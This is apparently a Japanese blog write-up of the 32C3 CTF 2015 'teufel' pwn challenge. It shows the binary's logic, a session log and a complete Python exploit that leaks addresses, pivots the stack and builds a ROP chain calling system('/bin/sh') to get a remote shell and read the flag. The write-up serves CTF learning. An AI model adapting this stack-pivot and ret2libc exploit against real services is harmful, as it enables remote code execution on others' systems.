---
layout: post
redirect_from:
  - /blog/2016/01/02/32c3-ctf-teufel/
date: 2016-01-02T23:20:01+09:00
tags: [ "ctf", "pwn", "writeup", "xinetd", "buffer-overflow", "rop" ]
---

# 32C3 CTF teufel

## [pwn 200: teufel](https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/teufel-200)

>   teufel is running at 36.243.194.41:666  
>   [Da ist der Teufel los]()

本番中には解けなかった。
後はlibcの関数のアドレスさえ取得できれば解ける、という所までは追い詰めたが、そこでコンテストが終わってしまった。後から解き直した。

大体以下のような挙動をするバイナリだが、`mmap`で取得しアクセス制限が付加された領域上を`rsp`が動く。アクセス制限のかかった範囲とかかっていない範囲の境界に`rsp`が来るので、これを移動させ自由にstackを使えるようにし、`system`へjumpすればよい。

``` c
#include <stdio.h>
#include <sys/mman.h>
void func(void *p) {
    if (read(stdin, p+0x2000-0x18, 8) <= 0) {
        exit(0);
    }
    if (read(stdin, p+0x2000-0x18, *(p+0x2000-0x18)) <= 0) {
        exit(0);
    }
    puts(p+0x2000-0x18);
    fflush(0);
    return;
}
int main(void) {
    void *p = mmap(NULL, 0x3000, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (p == -1) {
        exit(0);
    }
    if (mprotect(p+0x1000, 0x1000, PROT_READ | PROT_WRITE) == -1) {
        exit(0);
    }
    while (true) func(p);
}
```

#### 他のwriteup

-   <http://nandynarwhals.org/2015/12/31/32c3ctf-teufel-pwn-200/>
-   <http://pastebin.com/XAM9xfYU>
-   <https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/teufel-200>

#### 実装

後から主にamon氏の[writeup](http://nandynarwhals.org/2015/12/31/32c3ctf-teufel-pwn-200/)を参考に復習した結果のコード。成功するまで何度か叩けばshが起動する。

``` sh
$ ./a.py
send b'\xff\x1f\x00\x00\x00\x00\x00\x00'
send b'333333333'
recv b'333333333\xb0\xa9\x84\xff~\n'
rbp  0x7eff84a9b000
mmapped  0x7eff84a99000
libc  0x7eff844b1000
system  0x7eff844f53d0
bin_sh  0x7eff8463d3dd
send b'\xff\x1f\x00\x00\x00\x00\x00\x00'
send b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa8\xa9\x84\xff~\x00\x00\xee\x04@\x00\x00\x00\x00\x00'
recv b'\n'
send b'\xff\x1f\x00\x00\x00\x00\x00\x00'
send b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa2(M\x84\xff~\x00\x00\xdd\xd3c\x84\xff~\x00\x00\xd0SO\x84\xff~\x00\x00'
recv b'\n'
send b'ls\n'
$ telnet
flag.txt
teufel
cat flag.txt
32C3_mov_pop_ret_repeat
exit
*** Connection closed by remote host ***
```

``` python
#!/usr/bin/env python3
import sys
import os
import struct
import time
import socket
import telnetlib
import argparse

def p(n):
    return struct.pack('<Q', n)
def u(s):
    return struct.unpack('<Q', s)[0]

def recvline():
    print('recv ', end='')
    time.sleep(wait)
    t = []
    c = None
    while c != b'\n':
        c = s.recv(1)
        if not c:
            print(b''.join(t))
            print('Connection closed by foreign host.', file=sys.stderr)
            raise IOError
        t.append(c)
    t = b''.join(t)
    print(t)
    return t

def send(t):
    print('send ', end='')
    time.sleep(wait)
    print(t)
    s.send(t)

puts_got  = 0x600fd8 # objdump -d -M intel teufel
main      = 0x400480 # objdump -d -M intel teufel
func      = 0x4004e6 # objdump -d -M intel teufel

SSIZE_MAX = 32767 # man 2 read ; grep SSIZE_MAX /usr/include/**/*.h


parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='136.243.194.41')
parser.add_argument('port', nargs='?', type=int, default=666)
parser.add_argument('--explore-libc', action='store_true')
args = parser.parse_args()
args.local = args.host == 'localhost'

s = socket.create_connection((args.host, args.port))
wait = 0.5

send(p(SSIZE_MAX // 4))
send(b'3' * 9)
t = recvline()
assert t[:9] == b'3' * 9
assert t[-1] == ord(b'\n')
rbp = u((b'\0' + t[9:-1]).ljust(8, b'\0'))
print('rbp ', hex(rbp))

mmapped = rbp - 0x2000 # 4004cd:48 81 c5 00 20 00 00 add    rbp,0x2000
print('mmapped ', hex(mmapped))
if args.local:
    libc = mmapped - 0x5c2000 # --explore-libc
    system = libc + 0x3f890 # nm -D /usr/lib/libc.so.6 | grep '\<system\>'
    bin_sh = libc + 0x1653b8 # strings -tx /usr/lib/libc.so.6 | grep /bin/sh
    pop_rdi_ret = libc + 0x21012 # rp -r 1 -f /usr/lib/libc.so.6 --unique | grep 'pop\s\+rdi\s\+;\s\+ret\s'
else:
    libc = mmapped - 0x5e8000 # --explore-libc
    system = libc + 0x443d0 # nm -D libc.so.6 | grep '\<system\>'
    bin_sh = libc + 0x18c3dd # strings -tx libc.so.6 | grep /bin/sh
    pop_rdi_ret = libc + 0x218a2 # rp -r 1 -f libc.so.6 --unique | grep 'pop\s\+rdi\s\+;\s\+ret\s'
print('libc ', hex(libc))
print('system ', hex(system))
print('bin_sh ', hex(bin_sh))

send(p(SSIZE_MAX // 4))
send(b''.join(map(p, \
    [ 0 # mov rsp rbp
    , mmapped + 0x1800 # pop rbp
    , func + 8 # ret ; next loop without manipulating rsp & rbp
    ] )))
recvline()

if args.explore_libc:
    send(p(SSIZE_MAX // 4))
    send(b''.join(map(p, \
        [ 0 # mov rsp rbp
        , puts_got + 8 # pop rbp
        , func + 57 # ret ; puts & flush
        ] )))
    recvline()
    t = recvline()
    assert t[-1] == ord(b'\n')
    puts = u(t[:-1].ljust(8, b'\0'))
    print('puts ', hex(puts))
    if args.local:
        libc = puts - 0x6a8c0 # nm -D /usr/lib/libc.so.6 | grep '\<puts\>'
    else:
        libc = puts - 0x70a30 # nm -D libc.so.6 | grep '\<puts\>'
    print('libc ', hex(libc))
    print('mmapped - libc ', hex(mmapped - libc))

else:
    send(p(SSIZE_MAX // 4))
    send(b''.join(map(p, \
        [ 0 # mov rsp rbp ; 1
        , 0 # pop rbp ; 2
        , pop_rdi_ret # ret ; 3
        , bin_sh # pop rdi ; 4
        , system # ret ; 5
        ] )))
    recvline()

    send(b'ls\n')

    print('$ telnet')
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
```
